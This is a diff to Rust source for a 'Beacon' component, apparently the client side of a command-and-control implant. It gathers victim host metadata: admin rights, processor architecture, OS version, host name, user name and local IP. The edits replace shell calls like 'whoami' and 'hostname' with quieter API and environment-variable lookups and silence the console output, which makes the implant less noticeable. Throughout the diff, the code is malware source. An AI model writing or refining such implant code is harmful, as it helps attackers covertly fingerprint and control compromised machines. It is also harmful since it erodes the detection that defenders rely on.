@@ -2,6 +2,9 @@ use crate::util::os_command::os_system;
 use std::convert::TryInto;
 use std::mem;
 use std::net::{IpAddr, Ipv4Addr};
+use sys_info;
+use std::process::Command;
+use std::process;
 
 use anyhow::Result;
 use local_ip_address::local_ip;
@@ -139,11 +142,14 @@ impl Beacon {
             unsafe {
                 GetNativeSystemInfo(&mut system_info);
             }
+            
             unsafe {
                 let process_handle = unsafe { GetCurrentProcess() }; // 获取当前进程句柄
+                
                 if IsUserAnAdmin() == 1 {
                     flag += 8;
                 }
+                
                 if system_info.Anonymous.Anonymous.wProcessorArchitecture as u32 == 9 {
                     // PROCESSOR_ARCHITECTURE_AMD64 = 9
                     // println!("Running on 64-bit architecture (x86_64).");
@@ -156,7 +162,11 @@ impl Beacon {
             }
             flag
         };
-        let os_version = os_system("ver").unwrap_or("unknow_version".into());
+        
+        // let os_version = os_system("ver").unwrap_or("unknow_version".into());
+        // println!("os:{}",os_version);
+        let os_version = sys_info::os_release().unwrap_or_else(|_| "unknown_version".into());
+        // println!("OS Version: {}", os_version);
         let mut os_version_maj: u8 = 0;
         if let Some(version_str) = os_version.split(".").next() {
             if let Ok(version_num) = version_str
@@ -182,22 +192,34 @@ impl Beacon {
             let name = cur_exe.file_name().unwrap();
             name.to_string_lossy().to_string()
         };
-        let host_name = os_system("hostname").unwrap_or("unknow_hostname".into());
-        let user_name = os_system("whoami").unwrap_or("unknow_name".into());
+        
+        // let host_name = os_system("hostname").unwrap_or("unknow_hostname".into());
+        // let host_name = sys_info::hostname().unwrap_or_else(|_| "unknown_hostname".into());
+        let host_name = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown_hostname".into());
+        
+        // let user_name = os_system("whoami").unwrap_or("unknow_name".into());
+        let user_name = std::env::var("USERNAME").unwrap_or_else(|_| "unknown_name".into());
+        /*let output = Command::new("whoami")
+            .output()
+            .expect("failed to execute command");
+
+        let user_name = String::from_utf8_lossy(&output.stdout).trim().to_string();
+        */
+        
         let local_ip = match local_ip() {
             Ok(ip) => {
-                println!("local internal IP address is: {:?}", ip);
+                // println!("local internal IP address is: {:?}", ip);
                 ip
             }
             Err(e) => {
-                eprintln!("unable to obtain the internal network IP address: {}", e);
+                // eprintln!("unable to obtain the internal network IP address: {}", e);
                 IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1))
             }
         };
         let mut ip_bytes = match local_ip {
             IpAddr::V4(ipv4) => ipv4.octets().to_vec(),
             IpAddr::V6(_) => {
-                eprintln!("Getting an IPv6 address and returning 127.0.0.1");
+                // eprintln!("Getting an IPv6 address and returning 127.0.0.1");
                 Ipv4Addr::new(127, 0, 0, 1).octets().to_vec()
             }
         };
